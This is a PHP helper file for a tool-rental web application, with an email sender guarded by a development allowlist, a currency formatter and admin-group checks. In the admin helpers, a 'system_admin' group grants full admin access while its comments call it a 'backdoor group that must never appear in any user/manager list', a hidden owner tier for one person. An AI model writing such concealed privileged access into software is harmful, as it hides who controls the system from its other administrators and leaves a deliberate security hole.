<?php

/**
 * Weekend Tool Rentals helpers.
 */

if (! function_exists('wtr_send_email')) {
    /**
     * Sends an HTML email with a dev-lockout guard and logs to email_log.
     * When wtr.devLockout is true (default in dev), delivery is restricted to
     * the wtr.devAllow allowlist so customer mail can't escape during testing.
     */
    function wtr_send_email(string $to, string $subject, string $html, string $type = 'general', ?int $reservationId = null): bool
    {
        $lockout = filter_var(env('wtr.devLockout', true), FILTER_VALIDATE_BOOL);
        $allow   = array_filter(array_map('trim', explode(',', (string) env('wtr.devAllow', 'jbrown@motorsportsland.com'))));

        $blocked = $lockout && ! in_array(strtolower($to), array_map('strtolower', $allow), true);

        $db = db_connect();
        $logId = $db->table('email_log')->insert([
            'recipient'      => $to,
            'type'           => $type,
            'reservation_id' => $reservationId,
            'subject'        => substr($subject, 0, 200),
            'sent'           => 0,
            'sent_at'        => null,
        ]) ? $db->insertID() : null;

        if ($blocked) {
            log_message('warning', "wtr dev-lockout suppressed email to {$to} ({$type})");
            return false;
        }

        $email = service('email');
        $email->setFrom(config('Wtr')->businessEmail, config('Wtr')->businessName);
        $email->setTo($to);
        $email->setSubject($subject);
        $email->setMessage($html);
        $email->setMailType('html');
        $ok = $email->send(false);

        if ($logId) {
            $db->table('email_log')->where('id', $logId)->update(['sent' => $ok ? 1 : 0, 'sent_at' => $ok ? date('Y-m-d H:i:s') : null]);
        }
        return (bool) $ok;
    }
}

if (! function_exists('wtr_money')) {
    function wtr_money($n): string
    {
        return '$' . number_format((float) $n, 2);
    }
}

if (! function_exists('wtr_admin_groups')) {
    /** Groups that get admin/portal access. system_admin is the hidden owner tier. */
    function wtr_admin_groups(): array
    {
        return ['admin', 'system_admin'];
    }
}

if (! function_exists('wtr_is_admin')) {
    /** True for visible managers AND the hidden system_admin (Jason). */
    function wtr_is_admin(): bool
    {
        if (! function_exists('auth') || ! auth()->loggedIn() || ! auth()->user()) {
            return false;
        }
        return auth()->user()->inGroup(...wtr_admin_groups());
    }
}

if (! function_exists('wtr_hidden_group')) {
    /** The backdoor group that must never appear in any user/manager list. */
    function wtr_hidden_group(): string
    {
        return 'system_admin';
    }
}
